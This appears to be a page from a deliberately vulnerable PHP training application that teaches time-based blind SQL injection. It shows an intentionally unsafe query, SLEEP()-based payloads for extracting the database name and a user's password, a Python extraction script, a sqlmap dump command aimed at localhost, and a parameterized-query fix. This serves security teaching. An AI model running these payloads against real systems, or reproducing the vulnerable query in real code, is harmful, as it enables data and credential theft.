<?php if ( ! defined('SQL_INJECTION_IN_PHP') ) die('Direct access not permitted'); ?>

<nav aria-label="breadcrumb" class="mb-3">
  <ol class="breadcrumb">
    <li class="breadcrumb-item"><a href="?action=walkthroughs">Walkthroughs</a></li>
    <li class="breadcrumb-item active">Time-Based Blind</li>
  </ol>
</nav>

<div class="d-flex align-items-center gap-3 mb-4">
  <h2 class="mb-0">5. Time-Based Blind Injection</h2>
  <span class="badge bg-warning text-dark">Advanced</span>
  <span class="badge bg-secondary">Timing</span>
</div>

<div class="card mb-4">
  <div class="card-header bg-dark text-white"><strong>Overview</strong></div>
  <div class="card-body">
    <p>Time-based blind injection works when there is <strong>no output</strong>, <strong>no visible error</strong>, and <strong>no binary page difference</strong>. The attacker uses <code>SLEEP()</code> (MySQL) to introduce a deliberate response delay. If the page takes longer to respond, the condition tested was true.</p>
    <p>This is the most reliable but slowest SQLi technique. It works against hardened applications that suppress all output. The only defence is parameterized queries.</p>
    <p class="mb-0"><strong>Affected file:</strong> <code>pages/time_based.php</code></p>
  </div>
</div>

<div class="card mb-4 border-danger">
  <div class="card-header bg-danger text-white"><strong>Vulnerable Code</strong></div>
  <div class="card-body">
<pre class="bg-light p-3 rounded"><code>$uid = $_GET['uid'] ?? '';

$sql = "SELECT id FROM user WHERE id = {$uid}";

// Errors suppressed, no output returned — attacker sees nothing
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT);
$pdo->query($sql);

// Page always shows the same response — only timing varies
echo "Lookup complete.";</code></pre>
  </div>
</div>

<div class="card mb-4 border-warning">
  <div class="card-header bg-warning text-dark"><strong>Attack Walkthrough — Step by Step</strong></div>
  <div class="card-body">

    <h6 class="fw-bold">Step 1 — Confirm time-based injection</h6>
    <p>If the page takes ~3 seconds longer than normal, injection is confirmed:</p>
    <div class="bg-light p-2 rounded mb-3"><code>1 AND SLEEP(3)</code> → ~3 second delay = vulnerable</div>

    <h6 class="fw-bold">Step 2 — Confirm conditional execution</h6>
    <div class="bg-light p-2 rounded mb-1"><code>1 AND IF(1=1, SLEEP(3), 0)</code> → sleeps 3s (true)</div>
    <div class="bg-light p-2 rounded mb-3"><code>1 AND IF(1=2, SLEEP(3), 0)</code> → no delay (false)</div>

    <h6 class="fw-bold">Step 3 — Probe the DB name</h6>
    <div class="bg-light p-2 rounded mb-1"><code>1 AND IF(substring(database(),1,1)='s', SLEEP(3), 0)</code> → sleeps if 1st char is 's'</div>
    <div class="bg-light p-2 rounded mb-3"><code>1 AND IF(substring(database(),2,1)='q', SLEEP(3), 0)</code> → 2nd char is 'q'</div>

    <h6 class="fw-bold">Step 4 — Extract a password</h6>
    <div class="bg-light p-2 rounded mb-1">
      <code>1 AND IF(substring((SELECT password FROM user WHERE id=8),1,1)='1', SLEEP(3), 0)</code>
    </div>
    <div class="bg-light p-2 rounded mb-3">
      <code>1 AND IF(substring((SELECT password FROM user WHERE id=8),2,1)='2', SLEEP(3), 0)</code>
    </div>

    <h6 class="fw-bold">Step 5 — Use ASCII comparison for binary search (faster)</h6>
    <div class="bg-light p-2 rounded mb-3">
      <code>1 AND IF(ascii(substring((SELECT password FROM user WHERE id=8),1,1)) > 50, SLEEP(3), 0)</code>
    </div>

    <a href="?action=time_based" class="btn btn-sm btn-outline-warning">Open Time-Based Demo →</a>
  </div>
</div>

<div class="card mb-4 border-info">
  <div class="card-header bg-info text-white"><strong>Python Script — Automate Time-Based Extraction</strong></div>
  <div class="card-body">
<pre class="bg-light p-3 rounded small"><code>import requests, time

BASE    = "http://localhost:8080/profile.php"
CHARS   = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"
SLEEP_T = 3   # seconds to sleep when condition is true
THRESHOLD = 2.5  # detection threshold

def probe(query, pos, char):
    payload = f"1 AND IF(substring(({query}),{pos},1)='{char}', SLEEP({SLEEP_T}), 0)"
    start = time.time()
    requests.get(BASE, params={"action": "time_based", "uid": payload}, timeout=10)
    return time.time() - start >= THRESHOLD

def extract(query, max_len=32):
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for char in CHARS:
            if probe(query, pos, char):
                result += char
                print(f"  [{pos}] = '{char}'  →  so far: {result}")
                found = True
                break
        if not found:
            break
    return result

print("Extracting DB name...")
print(extract("SELECT database()"))
print("Extracting password for id=8...")
print(extract("SELECT password FROM user WHERE id=8"))
</code></pre>
  </div>
</div>

<div class="card mb-4 border-success">
  <div class="card-header bg-success text-white"><strong>Fix</strong></div>
  <div class="card-body">
<pre class="bg-light p-3 rounded"><code>$stmt = $pdo->prepare("SELECT id FROM user WHERE id = :id");
$stmt->execute([':id' => (int) $uid]);</code></pre>
    <p class="mb-0 text-success">The <code>SLEEP()</code> call is passed as a data value, not SQL. The database looks for a row with <code>id = "1 AND IF(..."</code> as a literal string. It finds nothing and returns immediately — no delay, no injection.</p>
  </div>
</div>

<div class="card">
  <div class="card-header bg-secondary text-white"><strong>Tools</strong></div>
  <div class="card-body">
    <pre class="bg-light p-2 rounded small">sqlmap -u "http://localhost:8080/profile.php?action=time_based&uid=1" \
  --technique=T --level=3 --dbms=mysql \
  -D sql_demo -T user -C email,password --dump --batch</pre>
    <p class="small mb-0">sqlmap's time technique (<code>-T T</code>) uses binary search with adaptive timing to extract data efficiently.</p>
  </div>
</div>
